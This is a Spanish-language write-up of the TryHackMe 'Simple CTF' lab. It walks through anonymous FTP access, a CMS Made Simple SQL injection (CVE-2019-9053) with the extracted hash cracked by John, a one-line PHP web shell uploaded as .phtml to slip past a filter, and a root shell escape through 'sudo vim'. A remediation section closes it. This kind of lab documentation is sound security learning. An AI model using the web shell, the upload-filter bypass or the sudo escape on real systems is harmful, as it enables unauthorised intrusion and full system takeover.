---
title: TryHackMe - Simple CTF
date: 2026-11-04
platform: TryHackMe
difficulty: Easy
os: Linux
tags:
  - SQLInjection
  - FTP
  - SSH
  - ReverseShell
  - MD5
  - John
  - RCE
  - Vim
status: Completada
---

# Resumen Ejecutivo
**IP Objetivo:** `<IP>`

**Descripción breve:** Máquina Linux de dificultad fácil que expone [[FTP - SFTP|FTP]] anónimo, un CMS Made Simple vulnerable a inyección SQL y [[SSH]] en un puerto no estándar. El FTP filtra una pista sobre la contraseña débil de `mitch`, la inyección SQL extrae su hash, [[John the Ripper|John]] lo descifra y el acceso por [[SSH]] permite escalar a `root` abusando de `sudo vim`.

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos con [[Nmap]]
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv <IP> -n -Pn -oG escaneo
```

**Puertos Abiertos:**
- 21 ([[FTP - SFTP|FTP]])
- 80 (HTTP)

### Enumeración de Servicios / Fuzzing
```bash
ftp <IP>    # usuario: anonymous, contraseña vacía
```

- [[FTP - SFTP|FTP]]: la sesión anónima está habilitada y se descarga `ForMitch.txt`, un archivo que advierte que la contraseña de `mitch` es débil.
- Enumeración web: se descubre el directorio `/simple`, que corresponde a una instalación de **CMS Made Simple 2.2.8**.

**Descubrimientos clave:**
- `/simple`: CMS Made Simple 2.2.8.
- FTP anónimo con una pista sobre las credenciales de `mitch`.

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- **CMS Made Simple 2.2.8** es vulnerable a una inyección SQL (SQLi, `CVE-2019-9053`). Se ejecuta un exploit público que extrae el salt, el usuario, el email y el hash de la contraseña:

```bash
[+] Salt for password: 1dac0d92e9fa6bb2
[+] Username: mitch
[+] Email: admin@admin.com
[+] Password hash: 0c01f4468bd75d7a84c7eb73846e8d96
```

- El hash corresponde a [[MD5]] con salt, así que se descifra con John the Ripper usando el formato `dynamic_4`:

```bash
john --format=dynamic_4 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

- La contraseña obtenida es `secret`. Con ella se accede al panel de administración, donde se encuentra una sección para subir archivos.

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Al intentar subir un archivo `.php` la aplicación lo bloquea, así que se sube con la extensión `.phtml` para evadir el filtro.
2. Se inserta un payload que permite ejecutar comandos de forma remota ([[RCE]]) a través del parámetro `cmd`.
3. Se obtiene ejecución de comandos como `www-data`, un usuario con privilegios muy limitados.

### Ejecución
```bash
<?php system($_GET['cmd']); ?>
```

- Se sube el archivo como `.phtml` y se accede a él desde el navegador añadiendo `?cmd=<comando>`.

**Prueba de acceso (User Flag):**
```bash
G00d j0b, keep up!
```

---

## 4. Privilege Escalation ([[Escaladas de privilegios]])

### Enumeración Interna
- Se identifica el servicio [[SSH]] en el puerto `2222`, enumerando internamente la maquina ya que nmap no lo mostro en un escaneo inicial.
- Se reutilizan las credenciales de `mitch` (`mitch:secret`) para conectarse por [[SSH]] y obtener una shell interactiva.
- Con `sudo -l` se revisan los permisos del usuario y se descubre que puede ejecutar `vim` como `root` sin contraseña.

### Explotación Local
1. `vim` permite ejecutar comandos desde su propia consola, por lo que se abusa del permiso de `sudo` (ver [[Escaladas de privilegios#sudo -l|sudo -l]]).
2. Se lanza una shell desde `vim` con el comando `:!/bin/sh`, que hereda los privilegios de `root`.

### Ejecución
```bash
ssh mitch@<IP> -p 2222
```

```bash
sudo -l
```

```bash
sudo vim -c ':!/bin/sh'
```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash
W3ll d0n3. You made it!
```

---

## 5. Post-Exploitation & Clean Up
- [x] Verificar el acceso como `root` y documentar la flag obtenida.
- [x] Eliminar los archivos temporales generados durante el ataque (payload, `hash.txt` y `ForMitch.txt`).
- [x] Cerrar las sesiones de [[FTP - SFTP|FTP]] y [[SSH]] abiertas.

---

## Remediation (Mitigaciones)
- **Acceso inicial:**
  - Deshabilitar el acceso anónimo en [[FTP - SFTP|FTP]] y exigir autenticación para la descarga de archivos.
  - Actualizar **CMS Made Simple** a una versión con el parche de la inyección SQL y validar todas las entradas.
  - Aplicar una política de contraseñas robusta y evitar el almacenamiento de pistas o credenciales en archivos accesibles.
  - Limitar los intentos de inicio de sesión en [[SSH]] (por ejemplo, con `fail2ban`).
- **Escalada:**
  - Revisar los permisos de `sudoers` y no conceder `sudo` sobre binarios que permitan escapar a una shell (`vim`, `less`, `find`, etc.).
  - Aplicar el principio de mínimo privilegio a los usuarios del sistema.
  - Auditar periódicamente los permisos con `sudo -l` y herramientas como GTFObins.
